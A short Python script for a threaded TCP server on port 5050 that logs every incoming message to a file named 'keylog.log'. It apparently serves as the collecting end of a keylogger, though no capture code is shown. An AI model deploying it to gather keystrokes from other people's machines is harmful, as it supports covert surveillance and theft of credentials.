import socket
import threading 
import logging

logging.basicConfig(filename="keylog.log", format='%(asctime)s - %(message)s', filemode='w')
logger = logging.getLogger() 
logger.setLevel(logging.DEBUG)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(socket.gethostname())
port = 5050
ADDR = (host, port)

server.bind(ADDR)
server.listen()

def write_log(client, address, message, error):
    logging_data = f'{client} - {address} - {message}'
    if(error):
        logger.error(logging_data)
    else:
        logger.info(logging_data)

def handler(client, address):
    while True:
        try:
            message = client.recv(2048).decode('utf-8')
            write_log(client, address, message, error=False)
        except:
            write_log(client, address, 'Disconnected!', error=True)
            client.close()
            break

def receive():
    while True:
        client, address = server.accept()
        write_log(client, address, 'Connection Established!', error=False)
        thread = threading.Thread(target=handler, args=(client, address)) 
        thread.start()

receive() 